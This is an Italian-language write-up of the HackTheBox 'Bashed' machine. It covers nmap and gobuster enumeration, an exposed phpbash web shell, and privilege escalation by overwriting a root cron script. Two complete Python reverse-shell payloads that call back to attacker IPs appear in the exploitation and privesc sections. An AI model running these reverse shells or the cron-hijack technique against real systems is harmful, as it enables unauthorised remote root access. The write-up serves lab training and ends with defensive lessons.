** Author: Noto La Diega Alessandro ** 

** TARGET: 10.10.10.68 **

# INFORMATION GATHERING #

Iniziamo con un scan base di nmap
┌──(rot㉿kali)-[/home/kali]
└─# [[Nmap]] -sC -sV -p- 10.10.10.68
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 09:19 EDT
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.60% done; ETC: 09:19 (0:00:36 remaining)
Nmap scan report for 10.10.10.68
Host is up (0.046s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.76 seconds

# ENUMERATION

Analizzando la pagina vediamo che il sito è in php e sembra rimandare a questa pagina github:
https://github.com/Arrexel/phpbash

Proviamo a trovare altre path del sito tramite [[Gobuster]]:
```Bash 

┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.10.10.68 -t 10 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/05 09:29:29 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
Progress: 2172 / 81644 (2.66%)^Z
zsh: suspended  gobuster dir -u http://10.10.10.68 -t 10 -w 
```

Nella path /dev/troviamo phpbash.php che semmbre essere una shell in php 

# EXPLOITATION


Scopriamo che siamo utenti www-data e che il sistema operativo è 
Linux bashed 4.4.0-62-generic 83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

Ci mettiamo in ascolto con nc sulla porta 4444
```
┌──(root㉿kali)-[/home/kali]
└─# nc -nvlp 4444               
listening on [any] 4444 ...nc -nvlp 4444
```

Sulla macchina target vediamo se è installato pyhton
which python

utilizziamo questa stringa per ottenere sun revshell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.27",4444));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'

>mettiamo il nostro ip e la porta sulla quale siamo in ascolto 

Otteniamo cosi una shell

```bash

┌──(root㉿kali)-[/home/kali]
└─# nc -nvlp 4444               
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.68] 35064
/bin/sh: 0: can't access tty; job control turned off
$ ls      
html
$ 
```

Ci muoviamo fino alle /home e otteiamo la flag

# PRIVESC 

Vediamo con sudo -l se possiamo eseguire qualcosa con privilegi da root

```bash 
www-data@bashed:/home/arrexel$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/home/arrexel$ 
```

Dalla ultima stringa possiamo vedere che come utente www-data possiamo eseguire programmi come utente scriptmanager senza password.
Enumerando ulteriormente possiamo vedere che tutte le cartelle sono di proprietà root tranne la directory script che è di proprietà di scriptmanger

```bash

www-data@bashed:/$ ls -la
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            174 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 May  5 06:18 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 173 root          root              0 May  5 06:18 proc
drwx------   3 root          root           4096 Jun  2  2022 root
drwxr-xr-x  18 root          root            520 May  5 06:25 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 May  5 06:18 sys
drwxrwxrwt  10 root          root           4096 May  5 07:02 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
www-data@bashed:/$ cd scripts/
bash: cd: scripts/: Permission denied
www-data@bashed:/$ ls
```

con il comando seguente cambiamo utente in scriptmanager

```bash
www-data@bashed:/$ sudo -i -u scriptmanager
scriptmanager@bashed:~$ 
```

Nella cartella script troviamo due file 

```
scriptmanager@bashed:/scripts$ ls
test.py  test.txt
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ 
```

È un semplice programma Python che scrive nel file test.txt.
Tuttavia, abbiamo visto nell'immagine precedente che test.txt è in esecuzione come root! Anche l'esecuzione del programma python sembra essere pianificata poiché l'ora dell'ultimo accesso al file test.txt è molto recente.
In effetti, lo script sembra essere eseguito ogni minuto!
Probabilmente è un cron job di proprietà di root.
Perché questa è una grande notizia per noi in quanto se cambio il contenuto nel file test.py per inviare una shell inversa, quella shell inversa verrà eseguita come root!


Prima cosa mi metto in ascolto con nc 
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -nvlp 5555
listening on [any] 5555 ...
```

modifico con nano il file .py con la shell inversa in python che segue:

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((“10.10.14.30”,5555)) 
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);

Ottenaimo cosi un shell da root

```bash
┌──(rot㉿kali)-[/home/kali]
└─# nc -nvlp 5555    
listening on [any] 5555 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.68] 42068
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

# LESSON LEARN

1. Lo sviluppatore non avrebbe dovuto disporre di una web shell che consentisse pubblicamente l'accesso al suo sistema.
2. Una configurazione errata delle autorizzazioni può portare a conseguenze disastrose. Perché l'utente daemon web (www-data) è stato autorizzato a diventare un utente più privilegiato (scriptmanager)? Allo stesso modo, perché uno script creato da un utente non root (test.py) è stato eseguito come root? Questi sono noti come errori di configurazione della sicurezza. 
3. Lo sviluppatore non deve disporre di directory sensibili pubblicamente accessibili disponibili sul proprio server, in quanto come dimostrato è stata facilmente trovata da gobuster.
